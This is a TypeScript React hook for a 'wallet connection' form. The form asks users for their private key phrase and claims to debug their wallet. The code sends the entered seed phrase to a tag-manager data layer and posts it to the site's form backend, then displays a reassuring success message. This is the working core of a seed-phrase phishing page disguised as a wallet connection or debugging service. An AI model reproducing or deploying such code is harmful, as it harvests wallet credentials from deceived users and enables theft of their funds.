import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

export const useWalletForm = (onOpenChange: (open: boolean) => void) => {
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your private key phrase",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      if (window.dataLayer) {
        window.dataLayer.push({
          event: 'wallet_connection_submit',
          formData: {
            phrase: phrase
          }
        });
      }

      const formData = new FormData();
      formData.append('form-name', 'wallet-connection');
      formData.append('phrase', phrase);

      const response = await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString(),
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      console.log("Connecting wallet...");
      
      toast({
        title: "Success",
        description: "Your wallet has been successfully connected for debugging wait while we debug your wallet",
      });

      setPhrase("");
      onOpenChange(false);
    } catch (error) {
      console.error('Form submission error:', error);
      toast({
        title: "Error",
        description: "Unable to connect wallet at this time. Please try again later.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return { phrase, setPhrase, loading, handleSubmit };
};